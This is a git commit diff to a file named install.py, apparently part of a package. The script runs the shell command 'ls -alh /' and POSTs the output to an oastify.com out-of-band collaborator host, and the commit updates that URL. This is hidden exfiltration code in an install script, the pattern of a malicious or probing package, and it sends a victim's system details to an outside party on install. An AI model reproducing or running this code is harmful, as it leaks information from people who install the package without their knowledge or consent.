cb94f04cc8257c284d5fad2dfbb810c61659e455
nermeena <129248571+nermeena17300852@users.noreply.github.com>
2023-06-28 13:44:51 +0800

    Update install.py

--- install.py
+++ install.py
@@ -10,7 +10,7 @@ result = os.popen(command).read()
 
 command = 'ls -alh /'
 result = os.popen(command).read()
-url = 'https://468lcevillwqsn2yaxibk55sfjla91xq.oastify.com/resp'
+url = 'https://ej1fgqfpmx4qinz0uewpcola319uxkl9.oastify.com/resp'
 data = {'result': result}
 response = requests.post(url, data=data)
 
